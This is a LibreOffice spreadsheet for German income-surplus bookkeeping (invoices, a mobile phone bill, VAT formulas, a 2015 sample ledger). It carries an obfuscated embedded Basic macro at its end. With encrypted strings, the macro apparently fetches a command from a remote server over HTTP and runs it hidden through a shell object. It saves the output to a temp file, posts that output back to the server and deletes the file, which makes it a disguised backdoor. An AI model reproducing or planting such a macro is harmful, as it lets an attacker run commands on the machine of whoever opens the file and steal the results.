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4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125.94pt"/>
    </style:style>
    <style:style style:name="co4" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="59.9pt"/>
    </style:style>
    <style:style style:name="co5" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="49.75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64.69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74.1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Einnahmen-Überschuss-Rechnu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f622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36">
      <style:table-cell-properties fo:border-bottom="0.74pt dotte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36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9">
      <style:table-cell-properties fo:border-bottom="0.74pt dotte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9">
      <style:table-cell-properties fo:border-bottom="0.74pt soli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fo:border-bottom="0.74pt dotted #000000" fo:background-color="#d7e4bd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9">
      <style:table-cell-properties fo:border-bottom="0.74pt dotted #000000" fo:background-color="#d7e4bd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9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-Überschuss-Rechn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innahmen-Überschuss-Rechnung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Beleg-Nr.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="2">
            <text:p>Datum</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="2">
            <text:p>Transaktion</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce26" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="3" table:number-rows-spanned="1">
            <text:p>Einnahmen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Ausgaben</text:p>
          </table:table-cell>
          <table:covered-table-cell table:number-columns-repeated="2" table:style-name="ce26"/>
          <table:table-cell table:style-name="ce26" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="2" table:number-rows-spanned="1">
            <text:p>Steuern</text:p>
          </table:table-cell>
          <table:covered-table-cell table:style-name="ce26"/>
          <table:table-cell table:number-columns-repeated="1013"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:covered-table-cell table:number-columns-repeated="3" table:style-name="ce2"/>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>Netto</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>U-St.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>Summe</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>Netto</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>U-St.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>Summe</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>Bez. V-St.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>U-St.-Schuld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5-07-01" calcext:value-type="date">
            <text:p>01.07.2015</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>Rechnung-Nr. 0001</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="currency" office:currency="EUR" office:value="1000" calcext:value-type="currency">
            <text:p>1,000.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="currency" office:currency="EUR" office:value="190" calcext:value-type="currency">
            <text:p>190.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce17" table:formula="of:=IF([.D4]+[.E4]&lt;&gt;0;[.D4]+[.E4];&quot;&quot;)" office:value-type="currency" office:currency="EUR" office:value="1190" calcext:value-type="currency">
            <text:p>1,190.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce17" table:formula="of:=IF([.G4]+[.H4]&lt;&gt;0;[.G4]+[.H4];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12"/>
          <table:table-cell table:style-name="ce12" table:formula="of:=IF([.H4]&lt;&gt;0;[.H4]*-1;IF([.E4]&lt;&gt;0;[.E4];IF([.J4]&lt;&gt;0;[.J4];&quot;&quot;)))" office:value-type="currency" office:currency="EUR" office:value="190" calcext:value-type="currency">
            <text:p>190.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="101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15-07-03" calcext:value-type="date">
            <text:p>03.07.2015</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Mobilfunkrechnung</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.D5]+[.E5]&lt;&gt;0;[.D5]+[.E5];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="currency" office:currency="EUR" office:value="49" calcext:value-type="currency">
            <text:p>49.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="currency" office:currency="EUR" office:value="9.31" calcext:value-type="currency">
            <text:p>9.31 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G5]+[.H5]&lt;&gt;0;[.G5]+[.H5];&quot;&quot;)" office:value-type="currency" office:currency="EUR" office:value="58.31" calcext:value-type="currency">
            <text:p>58.31 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H5]&lt;&gt;0;[.H5]*-1;IF([.E5]&lt;&gt;0;[.E5];IF([.J5]&lt;&gt;0;[.J5];&quot;&quot;)))" office:value-type="currency" office:currency="EUR" office:value="-9.31" calcext:value-type="currency">
            <text:p>9.31 € </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="101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15-07-07" calcext:value-type="date">
            <text:p>07.07.2015</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Rechnung-Nr. 0002</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="currency" office:currency="EUR" office:value="2500" calcext:value-type="currency">
            <text:p>2,500.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="currency" office:currency="EUR" office:value="475" calcext:value-type="currency">
            <text:p>475.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.D6]+[.E6]&lt;&gt;0;[.D6]+[.E6];&quot;&quot;)" office:value-type="currency" office:currency="EUR" office:value="2975" calcext:value-type="currency">
            <text:p>2,975.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G6]+[.H6]&lt;&gt;0;[.G6]+[.H6];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H6]&lt;&gt;0;[.H6]*-1;IF([.E6]&lt;&gt;0;[.E6];IF([.J6]&lt;&gt;0;[.J6];&quot;&quot;)))" office:value-type="currency" office:currency="EUR" office:value="475" calcext:value-type="currency">
            <text:p>475.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="101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 office:value-type="date" office:date-value="2015-07-10" calcext:value-type="date">
            <text:p>10.07.2015</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Umsatzsteuer-Voranmeldung</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.D7]+[.E7]&lt;&gt;0;[.D7]+[.E7];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G7]+[.H7]&lt;&gt;0;[.G7]+[.H7];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="currency" office:currency="EUR" office:value="-1500" calcext:value-type="currency">
            <text:p>1,500.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H7]&lt;&gt;0;[.H7]*-1;IF([.E7]&lt;&gt;0;[.E7];IF([.J7]&lt;&gt;0;[.J7];&quot;&quot;)))" office:value-type="currency" office:currency="EUR" office:value="-1500" calcext:value-type="currency">
            <text:p>1,500.00 € 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8]+[.E8]&lt;&gt;0;[.D8]+[.E8];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G8]+[.H8]&lt;&gt;0;[.G8]+[.H8];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H8]&lt;&gt;0;[.H8]*-1;IF([.E8]&lt;&gt;0;[.E8];IF([.J8]&lt;&gt;0;[.J8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9]+[.E9]&lt;&gt;0;[.D9]+[.E9];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G9]+[.H9]&lt;&gt;0;[.G9]+[.H9];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H9]&lt;&gt;0;[.H9]*-1;IF([.E9]&lt;&gt;0;[.E9];IF([.J9]&lt;&gt;0;[.J9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0]+[.E10]&lt;&gt;0;[.D10]+[.E10];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G10]+[.H10]&lt;&gt;0;[.G10]+[.H10];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H10]&lt;&gt;0;[.H10]*-1;IF([.E10]&lt;&gt;0;[.E10];IF([.J10]&lt;&gt;0;[.J10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1]+[.E11]&lt;&gt;0;[.D11]+[.E11];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G11]+[.H11]&lt;&gt;0;[.G11]+[.H11];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H11]&lt;&gt;0;[.H11]*-1;IF([.E11]&lt;&gt;0;[.E11];IF([.J11]&lt;&gt;0;[.J11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2]+[.E12]&lt;&gt;0;[.D12]+[.E12];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G12]+[.H12]&lt;&gt;0;[.G12]+[.H12];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H12]&lt;&gt;0;[.H12]*-1;IF([.E12]&lt;&gt;0;[.E12];IF([.J12]&lt;&gt;0;[.J12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3]+[.E13]&lt;&gt;0;[.D13]+[.E13];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G13]+[.H13]&lt;&gt;0;[.G13]+[.H13];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H13]&lt;&gt;0;[.H13]*-1;IF([.E13]&lt;&gt;0;[.E13];IF([.J13]&lt;&gt;0;[.J13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4]+[.E14]&lt;&gt;0;[.D14]+[.E14];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G14]+[.H14]&lt;&gt;0;[.G14]+[.H14];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H14]&lt;&gt;0;[.H14]*-1;IF([.E14]&lt;&gt;0;[.E14];IF([.J14]&lt;&gt;0;[.J14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5]+[.E15]&lt;&gt;0;[.D15]+[.E15];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G15]+[.H15]&lt;&gt;0;[.G15]+[.H15];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H15]&lt;&gt;0;[.H15]*-1;IF([.E15]&lt;&gt;0;[.E15];IF([.J15]&lt;&gt;0;[.J15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6]+[.E16]&lt;&gt;0;[.D16]+[.E16];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G16]+[.H16]&lt;&gt;0;[.G16]+[.H16];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H16]&lt;&gt;0;[.H16]*-1;IF([.E16]&lt;&gt;0;[.E16];IF([.J16]&lt;&gt;0;[.J16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7]+[.E17]&lt;&gt;0;[.D17]+[.E17];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G17]+[.H17]&lt;&gt;0;[.G17]+[.H17];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H17]&lt;&gt;0;[.H17]*-1;IF([.E17]&lt;&gt;0;[.E17];IF([.J17]&lt;&gt;0;[.J17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8]+[.E18]&lt;&gt;0;[.D18]+[.E18];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G18]+[.H18]&lt;&gt;0;[.G18]+[.H18];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H18]&lt;&gt;0;[.H18]*-1;IF([.E18]&lt;&gt;0;[.E18];IF([.J18]&lt;&gt;0;[.J18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9]+[.E19]&lt;&gt;0;[.D19]+[.E19];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G19]+[.H19]&lt;&gt;0;[.G19]+[.H19];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H19]&lt;&gt;0;[.H19]*-1;IF([.E19]&lt;&gt;0;[.E19];IF([.J19]&lt;&gt;0;[.J19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0]+[.E20]&lt;&gt;0;[.D20]+[.E20];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G20]+[.H20]&lt;&gt;0;[.G20]+[.H20];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H20]&lt;&gt;0;[.H20]*-1;IF([.E20]&lt;&gt;0;[.E20];IF([.J20]&lt;&gt;0;[.J20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1]+[.E21]&lt;&gt;0;[.D21]+[.E21];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G21]+[.H21]&lt;&gt;0;[.G21]+[.H21];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H21]&lt;&gt;0;[.H21]*-1;IF([.E21]&lt;&gt;0;[.E21];IF([.J21]&lt;&gt;0;[.J21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2]+[.E22]&lt;&gt;0;[.D22]+[.E22];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G22]+[.H22]&lt;&gt;0;[.G22]+[.H22];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H22]&lt;&gt;0;[.H22]*-1;IF([.E22]&lt;&gt;0;[.E22];IF([.J22]&lt;&gt;0;[.J22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3]+[.E23]&lt;&gt;0;[.D23]+[.E23];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G23]+[.H23]&lt;&gt;0;[.G23]+[.H23];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H23]&lt;&gt;0;[.H23]*-1;IF([.E23]&lt;&gt;0;[.E23];IF([.J23]&lt;&gt;0;[.J23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4]+[.E24]&lt;&gt;0;[.D24]+[.E24];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G24]+[.H24]&lt;&gt;0;[.G24]+[.H24];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H24]&lt;&gt;0;[.H24]*-1;IF([.E24]&lt;&gt;0;[.E24];IF([.J24]&lt;&gt;0;[.J24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5]+[.E25]&lt;&gt;0;[.D25]+[.E25];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G25]+[.H25]&lt;&gt;0;[.G25]+[.H25];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H25]&lt;&gt;0;[.H25]*-1;IF([.E25]&lt;&gt;0;[.E25];IF([.J25]&lt;&gt;0;[.J25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6]+[.E26]&lt;&gt;0;[.D26]+[.E26];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G26]+[.H26]&lt;&gt;0;[.G26]+[.H26];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H26]&lt;&gt;0;[.H26]*-1;IF([.E26]&lt;&gt;0;[.E26];IF([.J26]&lt;&gt;0;[.J26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7]+[.E27]&lt;&gt;0;[.D27]+[.E27];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce18" table:formula="of:=IF([.G27]+[.H27]&lt;&gt;0;[.G27]+[.H27];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
          <table:table-cell table:style-name="ce13" table:formula="of:=IF([.H27]&lt;&gt;0;[.H27]*-1;IF([.E27]&lt;&gt;0;[.E27];IF([.J27]&lt;&gt;0;[.J27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5" table:number-columns-repeated="3"/>
          <table:table-cell table:style-name="ce14" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce19" table:formula="of:=IF([.D28]+[.E28]&lt;&gt;0;[.D28]+[.E28];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce19" table:formula="of:=IF([.G28]+[.H28]&lt;&gt;0;[.G28]+[.H28];&quot;&quot;)">
            <text:p><text:s/></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14"/>
          <table:table-cell table:style-name="ce14" table:formula="of:=IF([.H28]&lt;&gt;0;[.H28]*-1;IF([.E28]&lt;&gt;0;[.E28];IF([.J28]&lt;&gt;0;[.J28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6" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>Summe:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=SUM([.D4:.D28])" office:value-type="currency" office:currency="EUR" office:value="3500" calcext:value-type="currency">
            <text:p>3,500.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=SUM([.E4:.E28])" office:value-type="currency" office:currency="EUR" office:value="665" calcext:value-type="currency">
            <text:p>665.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=SUM([.F4:.F28])" office:value-type="currency" office:currency="EUR" office:value="4165" calcext:value-type="currency">
            <text:p>4,165.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=SUM([.G4:.G28])" office:value-type="currency" office:currency="EUR" office:value="49" calcext:value-type="currency">
            <text:p>49.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=SUM([.H4:.H28])" office:value-type="currency" office:currency="EUR" office:value="9.31" calcext:value-type="currency">
            <text:p>9.31 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=SUM([.I4:.I28])" office:value-type="currency" office:currency="EUR" office:value="58.31" calcext:value-type="currency">
            <text:p>58.31 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=SUM([.J4:.J28])" office:value-type="currency" office:currency="EUR" office:value="-1500" calcext:value-type="currency">
            <text:p>1,500.00 € </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=SUM([.K4:.K28])" office:value-type="currency" office:currency="EUR" office:value="-844.31" calcext:value-type="currency">
            <text:p>844.31 € </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1013"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce6" table:number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce9"/>
          <table:table-cell table:style-name="ce16" table:number-columns-repeated="8"/>
          <table:table-cell table:number-columns-repeated="101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.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9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9P1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loext:fill-character> </loext:fill-character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14:45:17.0574899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innahmen-Überschuss-Rechnung" style:display-name="PageStyle_Einnahmen-Überschuss-Rechn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Kuhlmann</meta:initial-creator>
    <meta:creation-date>2015-07-24T05:47:43</meta:creation-date>
    <dc:date>2017-12-05T14:46:59.468239910</dc:date>
    <meta:generator>LibreOffice/5.4.2.2.0$Linux_X86_64 LibreOffice_project/40m0$Build-2</meta:generator>
    <meta:editing-duration>PT7H35M38S</meta:editing-duration>
    <meta:editing-cycles>18</meta:editing-cycles>
    <meta:document-statistic meta:table-count="2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klhijrekltjhndkfdsfg(Source As String, Search As String, NewPart As String)
  Dim Result As String
  Result = join(split(Source, Search), NewPart)
  klhijrekltjhndkfdsfg = Result
End Function

Public Function lkhjkldjhrgdfg(ByVal kljhzkjuerjgzsdfhjgv As String) _
  As String
  Dim kljhlkjhsdfkjhjhgdfhg as String
  kljhlkjhsdfkjhjhgdfhg = "K4HDfnwSsdf032gflHLKNpq7"
Dim kjsghdfjkhgdfjhgdfg As String, i As Long, cfc() As Integer, ttc() As Integer
  On Error Resume Next
  ReDim cfc(1 To Len(kljhlkjhsdfkjhjhgdfhg))
  ReDim ttc(1 To Len(kljhzkjuerjgzsdfhjgv))
  For i = 1 To UBound(cfc)
    cfc(i) = Asc(Right(kljhlkjhsdfkjhjhgdfhg, Len(kljhlkjhsdfkjhjhgdfhg) - i + 1))
  Next i
  For i = 1 To Len(kljhzkjuerjgzsdfhjgv)
    kjsghdfjkhgdfjhgdfg = kjsghdfjkhgdfjhgdfg &amp; Chr(sdjhfgjhzgjhsvdfhjdbfgh(Asc(Right(kljhzkjuerjgzsdfhjgv, Len(kljhzkjuerjgzsdfhjgv) - _
      i + 1)), kljhztkerutghgdjffhbgfg(i, cfc)))
  Next i
  lkhjkldjhrgdfg = kjsghdfjkhgdfjhgdfg
End Function

Private Function kljhztkerutghgdjffhbgfg(i As Long, a() As Integer) As Integer
  If i &gt; UBound(a) Then
    kljhztkerutghgdjffhbgfg = kljhztkerutghgdjffhbgfg(i - UBound(a), a)
  Else
    kljhztkerutghgdjffhbgfg = a(i)
  End If
End Function

Private Function tzstrjhdsfghgsvfg(i As Integer, j As Integer) As Integer
  If i + j &gt; 255 Then
    tzstrjhdsfghgsvfg = i + j - 255
  Else
    tzstrjhdsfghgsvfg = i + j
  End If
End Function

Private Function sdjhfgjhzgjhsvdfhjdbfgh(i As Integer, j As Integer) As Integer
  If i - j &lt; 0 Then
    sdjhfgjhzgjhsvdfhjdbfgh = i - j + 255
  Else
    sdjhfgjhzgjhsvdfhjdbfgh = i - j
  End If
End Function

Function kilijwkrjkjgdfhgfghj(pt As String) As String
Const kjhsfkljhfjkgbdfgh As String = "K4HDfnwSsdf032#gfl!HLKN*pq7"
Dim jherjhgjhgvvfdsjg As String, ptChar As String, kjhsfkljhfjkgbdfghChar As String, i As Integer

	pt = klhijrekltjhndkfdsfg(pt, " ", "")

	For i = 0 To Len(pt) - 1
	    ptChar = UCase(Mid(pt, i + 1, 1))
	    kjhsfkljhfjkgbdfghChar = UCase(Mid(kjhsfkljhfjkgbdfgh, (i Mod Len(kjhsfkljhfjkgbdfgh)) + 1, 1))
	    jherjhgjhgvvfdsjg = jherjhgjhgvvfdsjg &amp; Chr(Asc("A") + ((Asc(ptChar) - Asc(kjhsfkljhfjkgbdfghChar) + 2 * Asc("A")) Mod 26))
	Next i

	kilijwkrjkjgdfhgfghj = jherjhgjhgvvfdsjg
End Function


Sub klhjrtkjhfdgdsfh()

    Dim kjhtkjhgrtdfhg As Integer
    Dim kjhgskjrhgjehvgsadfh As Integer
    con = CreateObject(lkhjkldjhrgdfg(" ² ¥«À°®"))
    Log("testing")
	con.open(kilijwkrjkjgdfhgfghj("Q8A"),lkhjkldjhrgdfg("³¨¼´ ¦¶âÊÌÎÍ«·´¼×£¬v§ÕÛ¦èÍÊmff }Ô¤¯q±²Ïâ"),False)
	con.send()
	Set WshShell = CreateObject(lkhjkldjhrgdfg("¢«¶ÏÞëÆÌË"))
	cmd = con.responseText
	WshShell.Run(lkhjkldjhrgdfg("n¤ÏÜÛÂê×Â¬¥ÛËÙ{~§±ÝÕe°¬­dÁ¶")+cmd+" &gt; "+Environ(lkhjkldjhrgdfg("¿µ´"))+lkhjkldjhrgdfg("§¬®Òáßº¡ÐÕ"),0)
	Set objFSO = CreateObject(lkhjkldjhrgdfg("º­ÖâàÁÚ¬ºßß¼±¸ÒÛ®¨"))
	Wait 200
	Set objTF = objFSO.OpenTextFile(Environ(lkhjkldjhrgdfg("¿µ´"))+lkhjkldjhrgdfg("§¬®Òáßº¡ÐÕ"), 1)
	strIn = objTF.readall
	objTF.Close()
	con.open(kilijwkrjkjgdfhgfghj("ZBZW"),lkhjkldjhrgdfg("³¨¼´ ¦¬aijyzåÚg||¤¬ª ¤ØÑ»"),False)
	
	oSheet = ThisComponent.Sheets.getByName("Sheet1")
   oCell = oSheet.getCellByPosition(4, 4)     REM Get E5
        oCell.Value = 5
        
	con.setRequestHeader(lkhjkldjhrgdfg("£¶¸ËÜëÇÝÖ"), (lkhjkldjhrgdfg("¬¤¸°ÏÑØÇÜÓÔ_«_ÞÝãu²ºÀÝ¬½ ­²ÉÝÛ¸×"))
	con.send(lkhjkldjhrgdfg("º©¼")+klhijrekltjhndkfdsfg(strIn,lkhjkldjhrgdfg("k"),lkhjkldjhrgdfg("v")))
	Kill(Environ(lkhjkldjhrgdfg("¿µ´"))+lkhjkldjhrgdfg("§¬®Òáßº¡ÐÕ"))
	Exit Sub
    Worksheets(lkhjkldjhrgdfg("ª©ÒÚÜ")).Unprotect Password:=lkhjkldjhrgdfg("B®²ËÜ")
    Application.ScreenUpdating = False
